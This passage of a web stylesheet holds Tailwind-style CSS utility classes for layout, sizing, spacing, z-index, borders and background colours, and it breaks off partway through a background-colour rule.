
        .form-select:where([size]:not([size="1"])) {
            background-image: none;
            background-position: 0 0;
            background-repeat: unset;
            background-size: initial;
            padding-right: .75rem;
            -webkit-print-color-adjust: unset;
            print-color-adjust: unset
        }

        .sr-only {
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px;
            clip: rect(0, 0, 0, 0);
            border-width: 0;
            white-space: nowrap
        }

        .pointer-events-none {
            pointer-events: none
        }

        .pointer-events-auto {
            pointer-events: auto
        }

        .visible {
            visibility: visible
        }

        .static {
            position: static
        }

        .fixed {
            position: fixed
        }

        .absolute {
            position: absolute
        }

        .relative {
            position: relative
        }

        .sticky {
            position: sticky
        }

        .inset-0 {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0
        }

        .inset-x-0 {
            left: 0;
            right: 0
        }

        .\!bottom-28 {
            bottom: 7rem !important
        }

        .-bottom-1 {
            bottom: -.25rem
        }

        .-bottom-2 {
            bottom: -.5rem
        }

        .-bottom-5 {
            bottom: -1.25rem
        }

        .-left-0 {
            left: 0
        }

        .-left-11 {
            left: -2.75rem
        }

        .-left-5 {
            left: -1.25rem
        }

        .-right-0 {
            right: 0
        }

        .-right-1 {
            right: -.25rem
        }

        .-right-11 {
            right: -2.75rem
        }

        .-right-2 {
            right: -.5rem
        }

        .-right-5 {
            right: -1.25rem
        }

        .-top-1 {
            top: -.25rem
        }

        .-top-2 {
            top: -.5rem
        }

        .bottom-0 {
            bottom: 0
        }

        .bottom-2 {
            bottom: .5rem
        }

        .bottom-3 {
            bottom: .75rem
        }

        .bottom-4 {
            bottom: 1rem
        }

        .bottom-8 {
            bottom: 2rem
        }

        .bottom-\[-1px\] {
            bottom: -1px
        }

        .bottom-\[-6px\] {
            bottom: -6px
        }

        .bottom-\[calc\(100\%\+20px\)\] {
            bottom: calc(100% + 20px)
        }

        .bottom-full {
            bottom: 100%
        }

        .left-0 {
            left: 0
        }

        .left-1\/2 {
            left: 50%
        }

        .left-2 {
            left: .5rem
        }

        .left-3 {
            left: .75rem
        }

        .left-4 {
            left: 1rem
        }

        .left-5 {
            left: 1.25rem
        }

        .left-6 {
            left: 1.5rem
        }

        .left-8 {
            left: 2rem
        }

        .left-full {
            left: 100%
        }

        .right-0 {
            right: 0
        }

        .right-1\/2 {
            right: 50%
        }

        .right-12 {
            right: 3rem
        }

        .right-2 {
            right: .5rem
        }

        .right-3 {
            right: .75rem
        }

        .right-4 {
            right: 1rem
        }

        .right-5 {
            right: 1.25rem
        }

        .right-6 {
            right: 1.5rem
        }

        .right-7 {
            right: 1.75rem
        }

        .right-\[calc\(100\%-120px\)\] {
            right: calc(100% - 120px)
        }

        .right-full {
            right: 100%
        }

        .top-0 {
            top: 0
        }

        .top-1\/2 {
            top: 50%
        }

        .top-12 {
            top: 3rem
        }

        .top-14 {
            top: 3.5rem
        }

        .top-16 {
            top: 4rem
        }

        .top-2 {
            top: .5rem
        }

        .top-3 {
            top: .75rem
        }

        .top-36 {
            top: 9rem
        }

        .top-4 {
            top: 1rem
        }

        .top-5 {
            top: 1.25rem
        }

        .top-\[-1px\] {
            top: -1px
        }

        .top-\[12px\] {
            top: 12px
        }

        .top-\[14px\] {
            top: 14px
        }

        .top-\[40\%\] {
            top: 40%
        }

        .top-\[40px\] {
            top: 40px
        }

        .top-\[5px\] {
            top: 5px
        }

        .top-\[60\%\] {
            top: 60%
        }

        .top-\[90\%\] {
            top: 90%
        }

        .top-\[calc\(100\%\)\] {
            top: 100%
        }

        .top-\[calc\(100\%\+12px\)\] {
            top: calc(100% + 12px)
        }

        .top-\[calc\(100\%\+20px\)\] {
            top: calc(100% + 20px)
        }

        .top-\[calc\(100\%\+2px\)\] {
            top: calc(100% + 2px)
        }

        .top-\[calc\(100\%\+36px\)\] {
            top: calc(100% + 36px)
        }

        .top-\[calc\(100\%\+8px\)\] {
            top: calc(100% + 8px)
        }

        .top-full {
            top: 100%
        }

        .z-0 {
            z-index: 0
        }

        .z-10 {
            z-index: 10
        }

        .z-20 {
            z-index: 20
        }

        .z-30 {
            z-index: 30
        }

        .z-50 {
            z-index: 50
        }

        .z-\[-1\] {
            z-index: -1
        }

        .z-\[0\] {
            z-index: 0
        }

        .z-\[10\] {
            z-index: 10
        }

        .z-\[1\] {
            z-index: 1
        }

        .z-\[2\] {
            z-index: 2
        }

        .z-\[3\] {
            z-index: 3
        }

        .z-\[4\] {
            z-index: 4
        }

        .z-\[5\] {
            z-index: 5
        }

        .z-\[999\] {
            z-index: 999
        }

        .order-1 {
            order: 1
        }

        .col-span-1 {
            grid-column: span 1/span 1
        }

        .col-span-2 {
            grid-column: span 2/span 2
        }

        .col-span-3 {
            grid-column: span 3/span 3
        }

        .col-span-4 {
            grid-column: span 4/span 4
        }

        .col-span-5 {
            grid-column: span 5/span 5
        }

        .col-span-6 {
            grid-column: span 6/span 6
        }

        .col-span-full {
            grid-column: 1/-1
        }

        .m-auto {
            margin: auto
        }

        .mx-5 {
            margin-left: 1.25rem;
            margin-right: 1.25rem
        }

        .mx-8 {
            margin-left: 2rem;
            margin-right: 2rem
        }

        .mx-auto {
            margin-left: auto;
            margin-right: auto
        }

        .my-1 {
            margin-bottom: .25rem;
            margin-top: .25rem
        }

        .my-20 {
            margin-bottom: 5rem;
            margin-top: 5rem
        }

        .my-3 {
            margin-bottom: .75rem;
            margin-top: .75rem
        }

        .my-auto {
            margin-bottom: auto;
            margin-top: auto
        }

        .mb-1 {
            margin-bottom: .25rem
        }

        .mb-2 {
            margin-bottom: .5rem
        }

        .mb-4 {
            margin-bottom: 1rem
        }

        .mb-6 {
            margin-bottom: 1.5rem
        }

        .mb-8 {
            margin-bottom: 2rem
        }

        .mb-auto {
            margin-bottom: auto
        }

        .ml-\[7px\] {
            margin-left: 7px
        }

        .ml-auto {
            margin-left: auto
        }

        .mr-1 {
            margin-right: .25rem
        }

        .mr-2 {
            margin-right: .5rem
        }

        .mr-3 {
            margin-right: .75rem
        }

        .mr-8 {
            margin-right: 2rem
        }

        .mr-auto {
            margin-right: auto
        }

        .mt-1 {
            margin-top: .25rem
        }

        .mt-2 {
            margin-top: .5rem
        }

        .mt-24 {
            margin-top: 6rem
        }

        .mt-3 {
            margin-top: .75rem
        }

        .mt-32 {
            margin-top: 8rem
        }

        .mt-4 {
            margin-top: 1rem
        }

        .mt-\[128px\] {
            margin-top: 128px
        }

        .mt-\[550px\] {
            margin-top: 550px
        }

        .mt-\[66px\] {
            margin-top: 66px
        }

        .mt-\[75px\] {
            margin-top: 75px
        }

        .mt-auto {
            margin-top: auto
        }

        .box-content {
            box-sizing: initial
        }

        .block {
            display: block
        }

        .flex {
            display: flex
        }

        .inline-flex {
            display: inline-flex
        }

        .table {
            display: table
        }

        .grid {
            display: grid
        }

        .hidden {
            display: none
        }

        .aspect-4\/3 {
            aspect-ratio: 4/3
        }

        .aspect-\[11\/6\] {
            aspect-ratio: 11/6
        }

        .aspect-\[3\.2\/1\] {
            aspect-ratio: 3.2/1
        }

        .aspect-\[3\/1\] {
            aspect-ratio: 3/1
        }

        .aspect-\[5\/3\] {
            aspect-ratio: 5/3
        }

        .aspect-square {
            aspect-ratio: 1/1
        }

        .aspect-video {
            aspect-ratio: 16/9
        }

        .\!size-4 {
            height: 1rem !important;
            width: 1rem !important
        }

        .\!size-8 {
            height: 2rem !important;
            width: 2rem !important
        }

        .size-10 {
            height: 2.5rem;
            width: 2.5rem
        }

        .size-12 {
            height: 3rem;
            width: 3rem
        }

        .size-14 {
            height: 3.5rem;
            width: 3.5rem
        }

        .size-16 {
            height: 4rem;
            width: 4rem
        }

        .size-2 {
            height: .5rem;
            width: .5rem
        }

        .size-20 {
            height: 5rem;
            width: 5rem
        }

        .size-24 {
            height: 6rem;
            width: 6rem
        }

        .size-3 {
            height: .75rem;
            width: .75rem
        }

        .size-4 {
            height: 1rem;
            width: 1rem
        }

        .size-5 {
            height: 1.25rem;
            width: 1.25rem
        }

        .size-6 {
            height: 1.5rem;
            width: 1.5rem
        }

        .size-8 {
            height: 2rem;
            width: 2rem
        }

        .size-\[10px\] {
            height: 10px;
            width: 10px
        }

        .size-\[150px\] {
            height: 150px;
            width: 150px
        }

        .size-\[16px\] {
            height: 16px;
            width: 16px
        }

        .size-\[30px\] {
            height: 30px;
            width: 30px
        }

        .size-\[360px\] {
            height: 360px;
            width: 360px
        }

        .size-\[7px\] {
            height: 7px;
            width: 7px
        }

        .\!h-10 {
            height: 2.5rem !important
        }

        .\!h-7 {
            height: 1.75rem !important
        }

        .\!h-8 {
            height: 2rem !important
        }

        .\!h-\[34px\] {
            height: 34px !important
        }

        .\!h-auto {
            height: auto !important
        }

        .h-0 {
            height: 0
        }

        .h-1 {
            height: .25rem
        }

        .h-10 {
            height: 2.5rem
        }

        .h-11 {
            height: 2.75rem
        }

        .h-12 {
            height: 3rem
        }

        .h-14 {
            height: 3.5rem
        }

        .h-16 {
            height: 4rem
        }

        .h-2 {
            height: .5rem
        }

        .h-20 {
            height: 5rem
        }

        .h-24 {
            height: 6rem
        }

        .h-28 {
            height: 7rem
        }

        .h-3 {
            height: .75rem
        }

        .h-32 {
            height: 8rem
        }

        .h-36 {
            height: 9rem
        }

        .h-4 {
            height: 1rem
        }

        .h-40 {
            height: 10rem
        }

        .h-44 {
            height: 11rem
        }

        .h-48 {
            height: 12rem
        }

        .h-5 {
            height: 1.25rem
        }

        .h-52 {
            height: 13rem
        }

        .h-56 {
            height: 14rem
        }

        .h-6 {
            height: 1.5rem
        }

        .h-64 {
            height: 16rem
        }

        .h-7 {
            height: 1.75rem
        }

        .h-72 {
            height: 18rem
        }

        .h-8 {
            height: 2rem
        }

        .h-80 {
            height: 20rem
        }

        .h-9 {
            height: 2.25rem
        }

        .h-96 {
            height: 24rem
        }

        .h-\[100px\] {
            height: 100px
        }

        .h-\[102px\] {
            height: 102px
        }

        .h-\[105px\] {
            height: 105px
        }

        .h-\[150px\] {
            height: 150px
        }

        .h-\[152px\] {
            height: 152px
        }

        .h-\[22px\] {
            height: 22px
        }

        .h-\[250px\] {
            height: 250px
        }

        .h-\[300px\] {
            height: 300px
        }

        .h-\[336px\] {
            height: 336px
        }

        .h-\[360px\] {
            height: 360px
        }

        .h-\[400px\] {
            height: 400px
        }

        .h-\[42px\] {
            height: 42px
        }

        .h-\[450px\] {
            height: 450px
        }

        .h-\[500px\] {
            height: 500px
        }

        .h-\[51px\] {
            height: 51px
        }

        .h-\[60vh\] {
            height: 60vh
        }

        .h-\[70vh\] {
            height: 70vh
        }

        .h-\[780px\] {
            height: 780px
        }

        .h-\[7px\] {
            height: 7px
        }

        .h-\[80\%\] {
            height: 80%
        }

        .h-\[80px\] {
            height: 80px
        }

        .h-\[80vh\] {
            height: 80vh
        }

        .h-\[calc\(100\%-5rem\)\] {
            height: calc(100% - 5rem)
        }

        .h-\[calc\(100\%-66px\)\] {
            height: calc(100% - 66px)
        }

        .h-\[calc\(100vh-128px\)\] {
            height: calc(100vh - 128px)
        }

        .h-\[calc\(100vh-72px\)\] {
            height: calc(100vh - 72px)
        }

        .h-full {
            height: 100%
        }

        .h-screen {
            height: 100vh
        }

        .max-h-\[1500px\] {
            max-height: 1500px
        }

        .max-h-\[200px\] {
            max-height: 200px
        }

        .max-h-\[360px\] {
            max-height: 360px
        }

        .max-h-\[400px\] {
            max-height: 400px
        }

        .max-h-\[42px\] {
            max-height: 42px
        }

        .max-h-\[45vh\] {
            max-height: 45vh
        }

        .max-h-\[460px\] {
            max-height: 460px
        }

        .max-h-\[475px\] {
            max-height: 475px
        }

        .max-h-\[500px\] {
            max-height: 500px
        }

        .max-h-\[50vh\] {
            max-height: 50vh
        }

        .max-h-\[55vh\] {
            max-height: 55vh
        }

        .max-h-\[600px\] {
            max-height: 600px
        }

        .max-h-\[60vh\] {
            max-height: 60vh
        }

        .max-h-\[70vh\] {
            max-height: 70vh
        }

        .min-h-96 {
            min-height: 24rem
        }

        .min-h-\[250px\] {
            min-height: 250px
        }

        .min-h-\[270px\] {
            min-height: 270px
        }

        .min-h-\[307px\] {
            min-height: 307px
        }

        .min-h-\[70px\] {
            min-height: 70px
        }

        .min-h-\[70vh\] {
            min-height: 70vh
        }

        .min-h-\[75vh\] {
            min-height: 75vh
        }

        .min-h-\[85vh\] {
            min-height: 85vh
        }

        .min-h-screen {
            min-height: 100vh
        }

        .\!w-full {
            width: 100% !important
        }

        .w-0 {
            width: 0
        }

        .w-1 {
            width: .25rem
        }

        .w-1\/2 {
            width: 50%
        }

        .w-1\/3 {
            width: 33.333333%
        }

        .w-10 {
            width: 2.5rem
        }

        .w-11\/12 {
            width: 91.666667%
        }

        .w-12 {
            width: 3rem
        }

        .w-16 {
            width: 4rem
        }

        .w-2\/3 {
            width: 66.666667%
        }

        .w-20 {
            width: 5rem
        }

        .w-28 {
            width: 7rem
        }

        .w-32 {
            width: 8rem
        }

        .w-4 {
            width: 1rem
        }

        .w-5 {
            width: 1.25rem
        }

        .w-5\/6 {
            width: 83.333333%
        }

        .w-56 {
            width: 14rem
        }

        .w-6 {
            width: 1.5rem
        }

        .w-8 {
            width: 2rem
        }

        .w-80 {
            width: 20rem
        }

        .w-9 {
            width: 2.25rem
        }

        .w-\[0\.5px\] {
            width: .5px
        }

        .w-\[1px\] {
            width: 1px
        }

        .w-\[21px\] {
            width: 21px
        }

        .w-\[250px\] {
            width: 250px
        }

        .w-\[80\%\] {
            width: 80%
        }

        .w-\[98px\] {
            width: 98px
        }

        .w-fit {
            width: fit-content
        }

        .w-full {
            width: 100%
        }

        .w-screen {
            width: 100vw
        }

        .min-w-20 {
            min-width: 5rem
        }

        .min-w-36 {
            min-width: 9rem
        }

        .min-w-44 {
            min-width: 11rem
        }

        .min-w-56 {
            min-width: 14rem
        }

        .min-w-60 {
            min-width: 15rem
        }

        .min-w-64 {
            min-width: 16rem
        }

        .min-w-72 {
            min-width: 18rem
        }

        .min-w-\[460px\] {
            min-width: 460px
        }

        .min-w-\[50\%\] {
            min-width: 50%
        }

        .max-w-2xl {
            max-width: 42rem
        }

        .max-w-32 {
            max-width: 8rem
        }

        .max-w-3xl {
            max-width: 48rem
        }

        .max-w-4xl {
            max-width: 56rem
        }

        .max-w-80 {
            max-width: 20rem
        }

        .max-w-\[200px\] {
            max-width: 200px
        }

        .max-w-\[50\%\] {
            max-width: 50%
        }

        .max-w-\[80\%\] {
            max-width: 80%
        }

        .max-w-\[85vw\] {
            max-width: 85vw
        }

        .max-w-\[90vw\] {
            max-width: 90vw
        }

        .max-w-md {
            max-width: 28rem
        }

        .max-w-sm {
            max-width: 24rem
        }

        .max-w-xl {
            max-width: 36rem
        }

        .flex-1 {
            flex: 1 1 0%
        }

        .shrink-0 {
            flex-shrink: 0
        }

        .-translate-x-1\/2 {
            --tw-translate-x: -50%
        }

        .-translate-x-1\/2,
        .-translate-y-1\/2 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-translate-y-1\/2 {
            --tw-translate-y: -50%
        }

        .-translate-y-\[1px\] {
            --tw-translate-y: -1px
        }

        .-translate-y-\[1px\],
        .translate-x-1\/2 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .translate-x-1\/2 {
            --tw-translate-x: 50%
        }

        .translate-y-\[1px\] {
            --tw-translate-y: 1px
        }

        .-rotate-90,
        .translate-y-\[1px\] {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .-rotate-90 {
            --tw-rotate: -90deg
        }

        .rotate-180 {
            --tw-rotate: 180deg
        }

        .rotate-180,
        .rotate-90 {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .rotate-90 {
            --tw-rotate: 90deg
        }

        .rotate-\[135deg\] {
            --tw-rotate: 135deg
        }

        .rotate-\[135deg\],
        .scale-\[0\.65\] {
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .scale-\[0\.65\] {
            --tw-scale-x: .65;
            --tw-scale-y: .65
        }

        .scale-\[94\%\] {
            --tw-scale-x: 94%;
            --tw-scale-y: 94%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        @keyframes pulse {
            50% {
                opacity: .5
            }
        }

        .animate-pulse {
            animation: pulse 2s cubic-bezier(.4, 0, .6, 1) infinite
        }

        @keyframes spin {
            to {
                transform: rotate(1turn)
            }
        }

        .animate-spin {
            animation: spin 1s linear infinite
        }

        .cursor-default {
            cursor: default
        }

        .cursor-pointer {
            cursor: pointer
        }

        .select-none {
            -webkit-user-select: none;
            user-select: none
        }

        .resize {
            resize: both
        }

        .scroll-mt-24 {
            scroll-margin-top: 6rem
        }

        .scroll-mt-52 {
            scroll-margin-top: 13rem
        }

        .list-decimal {
            list-style-type: decimal
        }

        .grid-flow-col {
            grid-auto-flow: column
        }

        .grid-cols-2 {
            grid-template-columns: repeat(2, minmax(0, 1fr))
        }

        .grid-cols-3 {
            grid-template-columns: repeat(3, minmax(0, 1fr))
        }

        .grid-cols-4 {
            grid-template-columns: repeat(4, minmax(0, 1fr))
        }

        .grid-cols-5 {
            grid-template-columns: repeat(5, minmax(0, 1fr))
        }

        .grid-cols-6 {
            grid-template-columns: repeat(6, minmax(0, 1fr))
        }

        .grid-cols-8 {
            grid-template-columns: repeat(8, minmax(0, 1fr))
        }

        .grid-rows-5 {
            grid-template-rows: repeat(5, minmax(0, 1fr))
        }

        .grid-rows-\[0fr\] {
            grid-template-rows: 0fr
        }

        .grid-rows-\[1fr\] {
            grid-template-rows: 1fr
        }

        .\!flex-row {
            flex-direction: row !important
        }

        .flex-row {
            flex-direction: row
        }

        .flex-col {
            flex-direction: column
        }

        .flex-col-reverse {
            flex-direction: column-reverse
        }

        .flex-wrap {
            flex-wrap: wrap
        }

        .items-start {
            align-items: flex-start
        }

        .items-end {
            align-items: flex-end
        }

        .items-center {
            align-items: center
        }

        .justify-start {
            justify-content: flex-start
        }

        .justify-end {
            justify-content: flex-end
        }

        .justify-center {
            justify-content: center
        }

        .justify-between {
            justify-content: space-between
        }

        .\!gap-2 {
            gap: .5rem !important
        }

        .gap-1 {
            gap: .25rem
        }

        .gap-10 {
            gap: 2.5rem
        }

        .gap-12 {
            gap: 3rem
        }

        .gap-2 {
            gap: .5rem
        }

        .gap-3 {
            gap: .75rem
        }

        .gap-4 {
            gap: 1rem
        }

        .gap-5 {
            gap: 1.25rem
        }

        .gap-6 {
            gap: 1.5rem
        }

        .gap-7 {
            gap: 1.75rem
        }

        .gap-8 {
            gap: 2rem
        }

        .gap-\[6px\] {
            gap: 6px
        }

        .\!gap-x-2 {
            column-gap: .5rem !important
        }

        .gap-x-3 {
            column-gap: .75rem
        }

        .gap-x-4 {
            column-gap: 1rem
        }

        .gap-x-6 {
            column-gap: 1.5rem
        }

        .gap-y-2 {
            row-gap: .5rem
        }

        .gap-y-3 {
            row-gap: .75rem
        }

        .gap-y-4 {
            row-gap: 1rem
        }

        .divide-x>:not([hidden])~:not([hidden]) {
            --tw-divide-x-reverse: 0;
            border-left-width: calc(1px*(1 - var(--tw-divide-x-reverse)));
            border-right-width: calc(1px*var(--tw-divide-x-reverse))
        }

        .divide-y>:not([hidden])~:not([hidden]) {
            --tw-divide-y-reverse: 0;
            border-bottom-width: calc(1px*var(--tw-divide-y-reverse));
            border-top-width: calc(1px*(1 - var(--tw-divide-y-reverse)))
        }

        .divide-bw-100>:not([hidden])~:not([hidden]) {
            --tw-divide-opacity: 1;
            border-color: rgb(242 242 242/var(--tw-divide-opacity, 1))
        }

        .self-start {
            align-self: flex-start
        }

        .self-end {
            align-self: flex-end
        }

        .self-center {
            align-self: center
        }

        .self-stretch {
            align-self: stretch
        }

        .overflow-auto {
            overflow: auto
        }

        .overflow-hidden {
            overflow: hidden
        }

        .overflow-x-auto {
            overflow-x: auto
        }

        .overflow-y-auto {
            overflow-y: auto
        }

        .overflow-x-hidden {
            overflow-x: hidden
        }

        .overflow-y-hidden {
            overflow-y: hidden
        }

        .whitespace-normal {
            white-space: normal
        }

        .whitespace-nowrap {
            white-space: nowrap
        }

        .text-wrap {
            text-wrap: wrap
        }

        .\!text-nowrap {
            text-wrap: nowrap !important
        }

        .text-nowrap {
            text-wrap: nowrap
        }

        .text-balance {
            text-wrap: balance
        }

        .break-all {
            word-break: break-all
        }

        .\!rounded-3xl {
            border-radius: 1.5rem !important
        }

        .\!rounded-full {
            border-radius: 9999px !important
        }

        .\!rounded-lg {
            border-radius: .5rem !important
        }

        .\!rounded-none {
            border-radius: 0 !important
        }

        .\!rounded-xl {
            border-radius: .75rem !important
        }

        .rounded {
            border-radius: .25rem
        }

        .rounded-2xl {
            border-radius: 1rem
        }

        .rounded-3xl {
            border-radius: 1.5rem
        }

        .rounded-full {
            border-radius: 9999px
        }

        .rounded-lg {
            border-radius: .5rem
        }

        .rounded-md {
            border-radius: .375rem
        }

        .rounded-sm {
            border-radius: .125rem
        }

        .rounded-xl {
            border-radius: .75rem
        }

        .rounded-b-full {
            border-bottom-left-radius: 9999px;
            border-bottom-right-radius: 9999px
        }

        .rounded-l-3xl {
            border-bottom-left-radius: 1.5rem;
            border-top-left-radius: 1.5rem
        }

        .rounded-l-full {
            border-bottom-left-radius: 9999px;
            border-top-left-radius: 9999px
        }

        .rounded-r-3xl {
            border-bottom-right-radius: 1.5rem;
            border-top-right-radius: 1.5rem
        }

        .rounded-t-2xl {
            border-top-left-radius: 1rem;
            border-top-right-radius: 1rem
        }

        .rounded-t-3xl {
            border-top-left-radius: 1.5rem;
            border-top-right-radius: 1.5rem
        }

        .rounded-t-full {
            border-top-left-radius: 9999px;
            border-top-right-radius: 9999px
        }

        .rounded-t-xl {
            border-top-left-radius: .75rem;
            border-top-right-radius: .75rem
        }

        .rounded-tl-3xl {
            border-top-left-radius: 1.5rem
        }

        .rounded-tr-3xl {
            border-top-right-radius: 1.5rem
        }

        .\!border-2 {
            border-width: 2px !important
        }

        .border {
            border-width: 1px
        }

        .border-0 {
            border-width: 0
        }

        .border-2 {
            border-width: 2px
        }

        .border-4 {
            border-width: 4px
        }

        .border-x-0 {
            border-left-width: 0;
            border-right-width: 0
        }

        .border-b {
            border-bottom-width: 1px
        }

        .border-b-2 {
            border-bottom-width: 2px
        }

        .border-b-4 {
            border-bottom-width: 4px
        }

        .border-b-\[10px\] {
            border-bottom-width: 10px
        }

        .border-b-\[18px\] {
            border-bottom-width: 18px
        }

        .border-b-\[20px\] {
            border-bottom-width: 20px
        }

        .border-l {
            border-left-width: 1px
        }

        .border-l-4 {
            border-left-width: 4px
        }

        .border-l-\[10px\] {
            border-left-width: 10px
        }

        .border-l-\[5px\] {
            border-left-width: 5px
        }

        .border-l-\[9px\] {
            border-left-width: 9px
        }

        .border-r {
            border-right-width: 1px
        }

        .border-r-\[10px\] {
            border-right-width: 10px
        }

        .border-r-\[5px\] {
            border-right-width: 5px
        }

        .border-r-\[9px\] {
            border-right-width: 9px
        }

        .border-t {
            border-top-width: 1px
        }

        .border-t-0 {
            border-top-width: 0
        }

        .border-dashed {
            border-style: dashed
        }

        .border-none {
            border-style: none
        }

        .\!border-blue-400 {
            --tw-border-opacity: 1 !important;
            border-color: rgb(96 165 250/var(--tw-border-opacity, 1)) !important
        }

        .\!border-danger-main {
            --tw-border-opacity: 1 !important;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1)) !important
        }

        .\!border-primary {
            --tw-border-opacity: 1 !important;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1)) !important
        }

        .\!border-success-main {
            --tw-border-opacity: 1 !important;
            border-color: rgb(29 153 120/var(--tw-border-opacity, 1)) !important
        }

        .border-\[\#0F62FE\] {
            --tw-border-opacity: 1;
            border-color: rgb(15 98 254/var(--tw-border-opacity, 1))
        }

        .border-\[\#1890FF\] {
            --tw-border-opacity: 1;
            border-color: rgb(24 144 255/var(--tw-border-opacity, 1))
        }

        .border-\[\#6E6E6E\] {
            --tw-border-opacity: 1;
            border-color: rgb(110 110 110/var(--tw-border-opacity, 1))
        }

        .border-\[\#9DC0EE\] {
            --tw-border-opacity: 1;
            border-color: rgb(157 192 238/var(--tw-border-opacity, 1))
        }

        .border-\[\#B3B3B3\] {
            --tw-border-opacity: 1;
            border-color: rgb(179 179 179/var(--tw-border-opacity, 1))
        }

        .border-\[\#C6C6C6\] {
            --tw-border-opacity: 1;
            border-color: rgb(198 198 198/var(--tw-border-opacity, 1))
        }

        .border-\[\#D1D1D1\] {
            --tw-border-opacity: 1;
            border-color: rgb(209 209 209/var(--tw-border-opacity, 1))
        }

        .border-\[\#D9D9D9\] {
            --tw-border-opacity: 1;
            border-color: rgb(217 217 217/var(--tw-border-opacity, 1))
        }

        .border-black {
            --tw-border-opacity: 1;
            border-color: rgb(0 0 0/var(--tw-border-opacity, 1))
        }

        .border-blue-400 {
            --tw-border-opacity: 1;
            border-color: rgb(96 165 250/var(--tw-border-opacity, 1))
        }

        .border-bw-100 {
            --tw-border-opacity: 1;
            border-color: rgb(242 242 242/var(--tw-border-opacity, 1))
        }

        .border-bw-200 {
            --tw-border-opacity: 1;
            border-color: rgb(207 207 207/var(--tw-border-opacity, 1))
        }

        .border-bw-400 {
            --tw-border-opacity: 1;
            border-color: rgb(158 158 158/var(--tw-border-opacity, 1))
        }

        .border-bw-500 {
            --tw-border-opacity: 1;
            border-color: rgb(134 134 134/var(--tw-border-opacity, 1))
        }

        .border-bw-600 {
            --tw-border-opacity: 1;
            border-color: rgb(110 110 110/var(--tw-border-opacity, 1))
        }

        .border-danger-border {
            --tw-border-opacity: 1;
            border-color: rgb(255 128 128/var(--tw-border-opacity, 1))
        }

        .border-danger-main {
            --tw-border-opacity: 1;
            border-color: rgb(236 33 61/var(--tw-border-opacity, 1))
        }

        .border-gray-200 {
            --tw-border-opacity: 1;
            border-color: rgb(229 231 235/var(--tw-border-opacity, 1))
        }

        .border-primary {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1))
        }

        .border-primary-200 {
            --tw-border-opacity: 1;
            border-color: rgb(204 222 238/var(--tw-border-opacity, 1))
        }

        .border-success-main {
            --tw-border-opacity: 1;
            border-color: rgb(29 153 120/var(--tw-border-opacity, 1))
        }

        .border-transparent {
            border-color: #0000
        }

        .border-warning-border {
            --tw-border-opacity: 1;
            border-color: rgb(247 217 164/var(--tw-border-opacity, 1))
        }

        .border-warning-main {
            --tw-border-opacity: 1;
            border-color: rgb(247 166 51/var(--tw-border-opacity, 1))
        }

        .border-white {
            --tw-border-opacity: 1;
            border-color: rgb(255 255 255/var(--tw-border-opacity, 1))
        }

        .border-l-transparent {
            border-left-color: #0000
        }

        .border-r-transparent {
            border-right-color: #0000
        }

        .border-t-primary-600 {
            --tw-border-opacity: 1;
            border-top-color: rgb(102 156 205/var(--tw-border-opacity, 1))
        }

        .border-opacity-90 {
            --tw-border-opacity: .9
        }

        .\!bg-danger-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-danger-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(249 188 197/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-primary {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-success-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-success-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(142 204 187/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-transparent {
            background-color: initial !important
        }

        .\!bg-warning-main {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-warning-surface {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1)) !important
        }

        .\!bg-white {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
        }

        .bg-\[\#4c4c4c\] {
            --tw-bg-opacity: 1;
            background-color: rgb(76 76 76/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#818181\] {
            --tw-bg-opacity: 1;
            background-color: rgb(129 129 129/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#D9D9D9\] {
            --tw-bg-opacity: 1;
            background-color: rgb(217 217 217/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#E2FFF7\] {
            --tw-bg-opacity: 1;
            background-color: rgb(226 255 247/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#E5EBF180\] {
            background-color: #e5ebf180
        }

        .bg-\[\#E6EFF6\] {
            --tw-bg-opacity: 1;
            background-color: rgb(230 239 246/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#EEF4FC\] {
